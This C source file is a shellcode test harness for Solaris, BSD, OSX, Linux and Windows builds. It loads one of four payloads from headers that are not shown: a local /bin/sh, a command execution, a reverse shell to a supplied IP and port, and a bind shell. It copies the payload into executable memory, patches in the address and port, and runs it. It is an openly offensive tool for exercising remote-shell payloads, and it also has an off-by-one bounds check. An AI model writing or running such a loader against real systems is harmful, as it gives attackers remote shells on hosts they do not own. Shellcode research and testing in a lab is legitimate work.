
/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#ifdef _MSC_VER
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0502
#endif
#define WIN
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_  
#endif
#include <windows.h>
#include <shlwapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#define close closesocket
#define SHUT_RDWR SD_BOTH
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")
#else
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <signal.h>
#include <fcntl.h>
#endif

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#if defined(SX86)
#define TARGET "x86 SOLARIS"
  #include "solaris/cfg32.h"
  #include "solaris/sh32.h"
  #include "solaris/cmd32.h"
  #include "solaris/rs32.h"
  #include "solaris/bs32.h"
#elif defined(BSD32)
#define TARGET "x86 BSD"
  #include "bsd/cfg32.h"
  #include "bsd/sh32.h"
  #include "bsd/cmd32.h"
  #include "bsd/rs32.h"
  #include "bsd/bs32.h"
#elif defined(BSD)
#define TARGET "x86-64 BSD"
  #include "bsd/cfg64.h"
  #include "bsd/sh64.h"
  #include "bsd/cmd64.h"
  #include "bsd/rs64.h"
  #include "bsd/bs64.h"  
#elif defined(OSX)
#define TARGET "x86-64 OSX"
  #include "osx/cfg64.h"
  #include "osx/sh64.h"
  #include "osx/cmd64.h"
  #include "osx/rs64.h"
  #include "osx/bs64.h"
#elif defined(LINUX32)
#define TARGET "x86 LINUX"
  #include "linux/cfg32.h"
  #include "linux/sh32.h"
  #include "linux/cmd32.h"
  #include "linux/rs32.h"
  #include "linux/bs32.h"
#else
#define TARGET "x86-64 LINUX"
  #include "linux/cfg64.h"  
  #include "linux/sh64.h"
  #include "linux/cmd64.h"
  #include "linux/rs64.h"
  #include "linux/bs64.h"  
#endif

typedef struct shellcode_t {
  char *description, *code;
  int  code_len, port, ip;
} sc_t;

enum shellcode_idx {
  SH_IDX=0,
  CMD_IDX,
  RS_IDX,
  BS_IDX
};

sc_t codes[]=
{{"execve(\"/bin/sh\", {\"/bin/sh\", NULL}, 0)",
   SH,  SH_SIZE, 0, 0 },
  
 {"execve(\"/bin/sh\", {\"/bin/sh\", \"-c\", <cmd>, NULL}, 0)", 
   CMD, CMD_SIZE, 0, 0},
  
 {"socket(), connect(), execve(\"/bin/sh\")",                   
   RS,  RS_SIZE, RS_PORT_OFS, RS_IP_OFS },
   
 {"socket(), bind(), listen(), accept(), execve(\"/bin/sh\")",  
   BS,  BS_SIZE, BS_PORT_OFS, BS_IP_OFS }
};  

void xcode(int idx, char *cmd, int port_nbr, u_long ip)
{
  uint8_t *p;
  void    *bin     = NULL;
  int     cmd_len  = 0;
  int     code_len = codes[idx].code_len;
  int     port_ofs = codes[idx].port;
  int     ip_ofs   = codes[idx].ip;
  char    *code    = codes[idx].code;
  
  if (idx == CMD_IDX) {
    // execute command? increase code length to include command
    cmd_len = strlen(cmd) + 1;
  }
  printf ("[ executing : %s\n", codes[idx].description);
    
#ifdef WIN
  bin=VirtualAlloc (0, code_len + cmd_len, 
    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
#else
  bin=mmap (0, code_len + cmd_len, 
    PROT_EXEC | PROT_WRITE | PROT_READ, 
    MAP_ANON  | MAP_PRIVATE, -1, 0);
#endif
  if (bin!=NULL)
  {
    p=(uint8_t*)bin;
    
    memcpy ((void*)p, code, code_len);
    
    if (idx > SH_IDX) {
      if (idx == CMD_IDX) {
        memcpy ((void*)&p[code_len], cmd, cmd_len);
      } else {
        if (port_nbr != 0) {
          memcpy ((void*)&p[port_ofs], &port_nbr, sizeof(uint16_t));
        }
        if (ip != 0) {
          memcpy ((void*)&p[ip_ofs], &ip, sizeof(uint32_t));
        }
      }
    }      
    // execute
    ((void(*)())bin)();
        
#ifdef WIN
    VirtualFree (bin, code_len + cmd_len, MEM_RELEASE);
#else
    munmap (bin, code_len + cmd_len);
#endif
  }
}

void usage(void) {
  int i;
  
  printf ("\n  Target OS: %s", TARGET);

  printf ("\n  usage: test -s <number> -p <port> -a <ip address> -c <command>\n");
  printf ("\n  -c <command>  Command to execute");
  printf ("\n  -s <number>   Shellcode to execute (see table below)");
  printf ("\n  -p <port>     Port to use to bind/reverse shell (default is 1234)");
  printf ("\n  -a <ip>       Remote ipv4 address for reverse shell (default is localhost)\n\n");
  
  printf ("  %-6s  %-55s  %s\n", 
      "Number", "Description", "Size");

  printf ("  %-6s  %-55s  %s\n", 
      "======", "===========", "========");
      
  for (i=0; i<sizeof(codes)/sizeof(sc_t); i++) {
    printf ("  %-6i  %-55s  %i bytes\n", i, 
        codes[i].description, codes[i].code_len);
  }
  putchar('\n');
  exit(0);
}

/**F*****************************************************************/
char* getparam (int argc, char *argv[], int *i)
{
  int n=*i;
  if (argv[n][2] != 0) {
    return &argv[n][2];
  }
  if ((n+1) < argc) {
    *i=n+1;
    return argv[n+1];
  }
  printf ("[ %c%c requires parameter\n", argv[n][0], argv[n][1]);
  exit (0);
}

int main(int argc, char *argv[])
{
  int    i, port_nbr=0, sc=0;
  u_long ip=0;
  char   opt;
  char   *port=NULL, *address=NULL, *cmd=NULL;

  #ifdef WIN
  WSADATA wsa;

  WSAStartup(MAKEWORD(2,0), &wsa);
  #endif
  
  // for each argument
  for (i=1; i<argc; i++)
  {
    // is this option?
    if (argv[i][0]=='-' || argv[i][1]=='/')
    {
      // get option value
      opt=argv[i][1];
      switch (opt)
      {
        case 'c':
          cmd=getparam(argc, argv, &i);
          break;
        case 'r':     // remote ip address
          address=getparam(argc, argv, &i);
          break;
        case 's':     // shellcode number
          sc=atoi(getparam(argc, argv, &i)) + 1;
          break;
        case 'p':     // port number
          port=getparam(argc, argv, &i);
          break;
        case '?':     // display usage
        case 'h':
          usage ();
          break;
        default:
          printf ("[ unknown option %c\n", opt);
          usage();
          break;
      }
    }
  }
  
  // no parameters?
  if (sc==0) usage();
  
  sc--;
  
  // invalid shellcode selected?
  if (sc < 0 || sc > sizeof(codes)/sizeof(sc_t)) {
    printf ("\n  invalid shellcode number");
    return 0;
  }
  
  // check if cmd
  if (sc==CMD_IDX && cmd==NULL) {
    printf ("\n  no command line specified\n");
    return 0;
  }
  // check port number if provided
  if (port!=NULL) {
    port_nbr = atoi(port);
    if (port_nbr<=0 || port_nbr>65535) {
      printf ("\n  invalid port number");
      return 0;
    }
    port_nbr = htons(port_nbr);
  }
  
  // check ip address if provided
  if (address!=NULL) {
    ip = inet_addr(address);
    if (ip==0 || ip==~0UL) {
      printf("\n  invalid ip address");
      return 0;
    }
  }
  xcode (sc, cmd, port_nbr, ip);
  return 0;
}
